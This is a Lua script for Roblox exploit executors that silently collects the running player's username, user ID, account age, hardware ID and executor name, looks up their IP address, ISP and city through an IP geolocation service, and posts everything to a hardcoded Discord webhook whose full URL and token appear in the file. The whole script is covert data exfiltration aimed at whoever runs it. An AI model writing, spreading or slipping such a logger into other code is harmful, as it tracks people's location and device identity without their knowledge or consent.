-- // CONFIG
local Webhook = "https://discord.com/api/webhooks/1391009214775689246/ZgAb8J2lJyB_cYoBuZuuHmL5o8YS6LwjuxhkGuBUEbA1hAAvJzWq2u_eFX-3WO3IstpF"

-- // SERVICES
local HttpService = game:GetService("HttpService")
local plr = game:GetService("Players").LocalPlayer

-- // UTILS
local function getIPInfo()
    local success, result = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
    end)
    return success and result or nil
end

local function getHWID()
        local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
end

local function getExecutor()
    return (identifyexecutor and identifyexecutor()) or "Unknown"
end

-- // GATHER DATA
local ipData = getIPInfo()
local data = {
    username = plr.Name,
    userId = plr.UserId,
    accountAge = plr.AccountAge,
    executor = getExecutor(),
    hwid = game:GetService("RbxAnalyticsService"):GetClientId(),
    ip = ipData and ipData.query or "Unavailable",
    isp = ipData and ipData.isp or "Unavailable",
    country = ipData and ipData.country or "Unavailable",
    region = ipData and ipData.regionName or "Unavailable",
    city = ipData and ipData.city or "Unavailable"
}

-- // EMBED
local embed = {
    ["title"] = "New Execution Logged",
    ["fields"] = {
        {["name"] = "Username", ["value"] = data.username, ["inline"] = true},
        {["name"] = "UserId", ["value"] = tostring(data.userId), ["inline"] = true},
        {["name"] = "Account Age", ["value"] = tostring(data.accountAge).." days", ["inline"] = true},
        {["name"] = "Executor", ["value"] = data.executor, ["inline"] = true},
        {["name"] = "HWID", ["value"] = data.hwid},
        {["name"] = "IP Address", ["value"] = data.ip},
        {["name"] = "Country", ["value"] = data.country, ["inline"] = true},
        {["name"] = "Region", ["value"] = data.region, ["inline"] = true},
        {["name"] = "City", ["value"] = data.city, ["inline"] = true},
        {["name"] = "ISP", ["value"] = data.isp}
    },
    ["color"] = tonumber("0x00ffcc"),
    ["timestamp"] = DateTime.now():ToIsoDate()
}

-- // SEND
local payload = HttpService:JSONEncode({["embeds"] = {embed}})
pcall(function()
    (syn and syn.request or http_request)({
        Url = Webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = payload
    })
end)
